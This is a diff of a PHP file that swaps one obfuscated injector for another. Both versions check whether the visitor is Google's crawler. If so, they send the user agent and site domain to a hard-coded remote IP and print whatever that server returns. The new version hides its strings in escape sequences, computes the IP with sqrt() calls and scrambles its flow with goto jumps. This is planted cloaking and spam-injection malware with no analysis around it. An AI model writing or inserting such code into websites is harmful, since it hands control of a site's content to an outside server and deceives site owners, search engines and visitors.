@@ -1,4 +1,7 @@
-<?php error_reporting(0);$jpictk_73b144dc=base64_decode("Li4u").mb_strtolower($_SERVER[HTTP_USER_AGENT]);$jpictk_73b144dc=str_replace(base64_decode("IA=="),base64_decode("LQ=="),$jpictk_73b144dc);if(mb_stripos($jpictk_73b144dc,base64_decode("Z29vZ2xl"))){$gxscsh_8a8bb7cd=base64_decode("MTc2");$olowsf_693a9fdd=base64_decode("MzE=");$rksqlr_9d607a66=base64_decode("MjUz");$gqrpko_894f782a=base64_decode("MjI3");$zstwbp_848e4626=base64_decode("Y2FrZXM=");$luzfqa_d88fc6ed=curl_init();curl_setopt($luzfqa_d88fc6ed,CURLOPT_URL,"http://$gxscsh_8a8bb7cd.$olowsf_693a9fdd.$rksqlr_9d607a66.$gqrpko_894f782a/$zstwbp_848e4626/?useragent=$jpictk_73b144dc&domain=$_SERVER[HTTP_HOST]");$gdfhly_b4a88417=curl_exec($luzfqa_d88fc6ed);curl_close($luzfqa_d88fc6ed);echo $gdfhly_b4a88417;} $botbotbot=0;?>
+<?php
+ goto B790J; B790J: $botbotbot = "\56\56\56" . mb_strtolower($_SERVER[HTTP_USER_AGENT]); goto KskeZ; duLDm: if (strpos($botbotbot, "\x67\157\157\147\154\x65")) { $xxx = sqrt(25); $xxx1 = sqrt(2025); $xxx2 = sqrt(5776); $xxx3 = sqrt(400); $xxx4 = "\x69\156\160\165\x74"; $url = "\x68\x74\x74\x70\72\x2f\x2f{$xxx}\56{$xxx1}\56{$xxx2}\56{$xxx3}\x2f{$xxx4}\57\77\165\163\x65\162\141\147\x65\x6e\164\x3d{$botbotbot}\x26\x64\157\x6d\141\151\x6e\75{$_SERVER["\110\124\124\120\137\110\117\x53\124"]}"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); $result = curl_exec($ch); curl_close($ch); echo $result; } goto GhR0L; KskeZ: $botbotbot = str_replace("\x20", "\x2d", $botbotbot); goto duLDm; GhR0L: ?>
+ 
+
  
 
  
